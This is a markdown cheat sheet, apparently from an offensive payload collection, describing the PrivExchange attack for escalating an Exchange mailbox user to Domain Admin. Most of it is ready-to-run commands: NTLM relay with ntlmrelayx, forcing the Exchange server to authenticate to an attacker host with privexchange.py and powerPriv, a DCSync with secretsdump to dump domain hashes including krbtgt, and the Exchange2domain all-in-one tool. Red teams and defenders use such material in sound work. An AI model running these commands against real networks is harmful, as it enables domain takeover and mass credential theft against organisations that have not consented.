# PrivExchange

Exchange your privileges for Domain Admin privs by abusing Exchange.    
:warning: You need a shell on a user account with a mailbox.


1. Exchange server hostname or IP address

    ```bash 
    pth-net rpc group members "Exchange Servers" -I dc01.domain.local -U domain/username
    ```


2. Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).

    ```powershell
    ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username
    ```


3. Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine.

    ```bash
    # https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py
    python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx
    python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange
    
    # https://github.com/G0ldenGunSec/PowerPriv 
    powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
    ```

4. Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash

    ```bash
    python secretsdump.py xxxxxxxxxx -just-dc
    python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm
    ```

5. Clean your mess and restore a previous state of the user's ACL

    ```powershell
    python aclpwn.py --restore ../aclpwn-20190319-125741.restore
    ```

Alternatively you can use the Metasploit module 

[`use auxiliary/scanner/http/exchange_web_server_pushsubscription`](https://github.com/rapid7/metasploit-framework/pull/11420)

Alternatively you can use an all-in-one tool : Exchange2domain.

```powershell
git clone github.com/Ridter/Exchange2domain 
python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
```


## References

* [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
* [Exploiting PrivExchange - April 11, 2019 - @chryzsh](https://chryzsh.github.io/exploiting-privexchange/)
* [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
* [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)
